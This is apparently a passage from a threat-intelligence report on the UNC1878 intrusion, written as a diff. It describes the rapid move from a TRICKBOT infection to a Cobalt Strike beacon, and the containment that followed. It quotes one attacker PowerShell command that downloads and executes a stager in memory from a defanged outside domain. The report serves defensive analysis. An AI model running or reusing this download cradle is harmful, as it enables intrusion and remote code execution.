@@ -1,0 +1,10 @@
+
+Figure 1:
+Initial Reconnaissance Approximately twenty minutes after reconnaissance, the adversary ran a PowerShell command to download and execute a Cobalt Strike HTTPS BEACON stager in memory (Figure 2).
+cmd.exe /c powershell.exe -nop –w hidden –c “IEX ((new-object net.webclient).downloadstring(‘hxxps://cylenceprotect[.]com:80/abresgbserthgsbabrt’))” Figure 2: PowerShell download cradle used to request a Cobalt Strike stager Six minutes later, Managed Defense identified evidence of enumeration and attempted lateral movement through the BEACON implant.
+Managed Defense alerted the client of the activity and the affected hosts were contained, stopping the intrusion in its tracks.
+A delta of approximately forty-six minutes between a TRICKBOT infection and attempted lateral movement was highly unusual and, along with the clever masquerade domain, warranted further examination by our team.
+Although light, indicators from this intrusion were distinct enough to create an uncategorized threat group, referred to as UNC1878.
+At the time of initial clustering, UNC1878’s intent was not fully understood due to the rapid containment of the intrusion by Managed Defense.
+By creating this label, we are able to link activity from the Managed Defense investigation into a single entity, allowing us to expand our understanding of this group and track their activity over time.
+This is especially important when dealing with campaigns involving mass malware, as it helps delineate the interactive actor from the malware campaign they are leveraging.
